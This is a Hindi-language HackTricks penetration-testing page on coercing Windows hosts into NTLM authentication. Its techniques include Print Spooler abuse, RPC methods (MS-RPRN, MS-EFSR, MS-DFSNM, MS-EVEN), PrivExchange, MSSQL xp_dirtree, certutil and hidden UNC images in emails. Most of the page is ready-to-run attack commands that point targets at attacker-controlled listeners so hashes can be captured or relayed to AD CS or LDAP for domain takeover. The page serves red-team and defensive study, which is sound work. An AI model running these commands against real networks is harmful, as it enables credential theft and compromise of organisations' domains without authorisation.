# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) **remote authentication triggers** का एक **collection** है, जिसे 3rd party dependencies से बचने के लिए MIDL compiler का उपयोग करके C# में coded किया गया है।

## Spooler Service Abuse

यदि _**Print Spooler**_ service **enabled** है, तो आप कुछ पहले से ज्ञात AD credentials का उपयोग करके Domain Controller के print server से नए print jobs पर एक **update** का **request** कर सकते हैं और उसे केवल यह बता सकते हैं कि notification **किसी system को भेजी जाए**।\
ध्यान दें कि जब printer notification किसी arbitrary system को भेजता है, तो उसे उस **system के विरुद्ध authenticate** करना पड़ता है। इसलिए, attacker _**Print Spooler**_ service को किसी arbitrary system के विरुद्ध authenticate करने के लिए बाध्य कर सकता है, और service इस authentication में **computer account** का **use करेगी**।

Under the hood, classic **PrinterBug** primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** का abuse **`\\PIPE\\spoolss`** पर करता है। Attacker पहले printer/server handle खोलता है और फिर `pszLocalMachine` में एक fake client name देता है, जिससे target spooler एक notification channel **attacker-controlled host को वापस** बनाता है। इसी कारण इसका प्रभाव direct code execution के बजाय **outbound authentication coercion** होता है।<sup>[[2]](#references)</sup>\
यदि आप spooler में ही **RCE/LPE** खोज रहे हैं, तो [PrintNightmare](printnightmare.md) देखें। यह page **coercion और relay** पर focused है।

### Domain पर Windows Servers खोजना

Windows hosts की list बनाने के लिए PowerShell का उपयोग करें। Servers आमतौर पर highest-priority targets होते हैं, इसलिए पहले उन पर focus करें:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Listening कर रही Spooler services खोजना

@mysmartlogin (Vincent Le Toux) के थोड़े संशोधित [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करके जाँचें कि Spooler Service listening कर रही है या नहीं:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप Linux पर `rpcdump.py` का उपयोग करके **MS-RPRN** protocol भी खोज सकते हैं:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
या Linux से **NetExec/CrackMapExec** का उपयोग करके hosts का तुरंत परीक्षण करें:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
यदि आप केवल यह जाँचने के बजाय कि spooler endpoint मौजूद है, **coercion surfaces** को enumerate करना चाहते हैं, तो **Coercer scan mode** का उपयोग करें:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
यह उपयोगी है क्योंकि EPM में endpoint देखने से केवल यह पता चलता है कि print RPC interface registered है। यह **गारंटी नहीं देता** कि हर coercion method आपके वर्तमान privileges के साथ reachable है या host usable authentication flow emit करेगा।

### Service को किसी arbitrary host के विरुद्ध authenticate करने के लिए कहें

आप [SpoolSample को यहाँ से](https://github.com/NotMedic/NetNTLMtoSilverTicket) compile कर सकते हैं।
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या यदि आप Linux पर हैं, तो [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer** के साथ, आप spooler interfaces को सीधे target कर सकते हैं और यह अनुमान लगाने से बच सकते हैं कि कौन-सा RPC method exposed है:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient के साथ SMB के बजाय HTTP को बाध्य करना

Classic PrinterBug आमतौर पर `\\attacker\share` पर **SMB** authentication प्राप्त करता है, जो अभी भी **capture**, **HTTP targets पर relay** या जहां **SMB signing** मौजूद नहीं है वहां **relay** के लिए उपयोगी है।\
हालांकि, आधुनिक environments में **SMB signing** के कारण **SMB से SMB** relaying अक्सर blocked होती है, इसलिए operators अक्सर इसके बजाय **HTTP/WebDAV** authentication को बाध्य करना पसंद करते हैं।

यदि target पर **WebClient** service चल रही है, तो listener को ऐसे form में specify किया जा सकता है जिससे Windows **WebDAV over HTTP** का उपयोग करे:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
यह विशेष रूप से **`ntlmrelayx --adcs`** या अन्य HTTP relay targets के साथ chaining करते समय उपयोगी है, क्योंकि इससे coerced connection पर SMB relayability पर निर्भरता समाप्त हो जाती है। महत्वपूर्ण caveat यह है कि HTTP/WebDAV variant के काम करने के लिए victim पर **WebClient चल रहा होना चाहिए**।

### Unconstrained Delegation के साथ संयोजन

यदि attacker ने [Unconstrained Delegation](unconstrained-delegation.md) के लिए configured किसी computer को compromise कर लिया है, तो वह **printer को उस computer के साथ authenticate करने के लिए coerce कर सकता है**। इसके बाद printer computer account का **TGT** unconstrained-delegation host की memory में cache हो जाता है, जहां attacker इसे [Pass the Ticket](pass-the-ticket.md) के साथ retrieve और reuse कर सकता है।

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (वे interfaces/opnums जो outbound auth trigger करते हैं)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: उसी spooler pipe पर asynchronous print interface; किसी दिए गए host पर reachable methods enumerate करने के लिए Coercer का उपयोग करें<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (\\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon के माध्यम से भी)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

ध्यान दें: ये methods ऐसे parameters स्वीकार करते हैं जिनमें UNC path हो सकता है, जैसे `\\attacker\share`। Process किए जाने पर Windows उस UNC से authenticate करेगा (machine/user context), जिससे NetNTLM capture या relay संभव हो जाता है।\
spooler abuse के लिए **MS-RPRN opnum 65** अभी भी सबसे सामान्य और सबसे अच्छी तरह documented primitive है, क्योंकि protocol specification स्पष्ट रूप से बताती है कि server `pszLocalMachine` द्वारा specified client के पास वापस एक notification channel बनाता है।<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target दिए गए backup log path को open करने का प्रयास करता है और attacker-controlled UNC से authenticate करता है।<sup>[[1]](#references)</sup>
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) को NetNTLM emit करने के लिए coerce करें, फिर AD CS endpoints (ESC8/ESC11 scenarios) या अन्य privileged services पर relay करें।<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack **Exchange Server के `PushSubscription` feature** में पाई गई एक flaw का परिणाम है। यह feature किसी mailbox वाले domain user को Exchange server को HTTP के माध्यम से किसी भी client-provided host से authenticate करने के लिए force करने की अनुमति देता है।

By default, **Exchange service SYSTEM के रूप में run होती है** और उसे अत्यधिक privileges दिए जाते हैं (विशेष रूप से, 2019 से पहले के Cumulative Update पर उसके पास **WriteDacl privileges on the domain** होते हैं)। इस flaw का exploitation LDAP को information relay करने और उसके बाद domain NTDS database extract करने के लिए किया जा सकता है। यदि LDAP पर relaying संभव न हो, तो इस flaw का उपयोग domain के अन्य hosts पर relay और authenticate करने के लिए फिर भी किया जा सकता है। इस attack का सफल exploitation किसी भी authenticated domain user account के साथ Domain Admin को तत्काल access प्रदान करता है।

## Windows के अंदर

यदि आप पहले से Windows machine के अंदर हैं, तो आप privileged accounts का उपयोग करके Windows को किसी server से connect करने के लिए force कर सकते हैं:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
या इस अन्य technique का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM authentication को coerce करने के लिए certutil.exe lolbin (Microsoft-signed binary) का उपयोग करना संभव है:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

यदि आपको उस user का **email address** पता है जो उस machine में login करता है जिसे आप compromise करना चाहते हैं, तो आप उसे बस **1x1 image वाला email** भेज सकते हैं, जैसे
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
जब victim इसे खोलता है, Windows authenticate करने का प्रयास करता है।

### MitM

यदि आप MitM attack कर सकते हैं और victim द्वारा देखे जा रहे page में HTML inject कर सकते हैं, तो इस तरह की image inject करने का प्रयास करें:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication को force और phish करने के अन्य तरीके


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 को crack करना

यदि आप [NTLMv1 challenges capture कर सकते हैं, तो उन्हें crack करने का तरीका यहां पढ़ें](../ntlm/index.html#ntlmv1-attack)।\
_याद रखें कि NTLMv1 को crack करने के लिए आपको Responder challenge को "1122334455667788" पर सेट करना होगा_

## References

- [1] [Unit 42 – Authentication Coercion लगातार विकसित हो रहा है](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
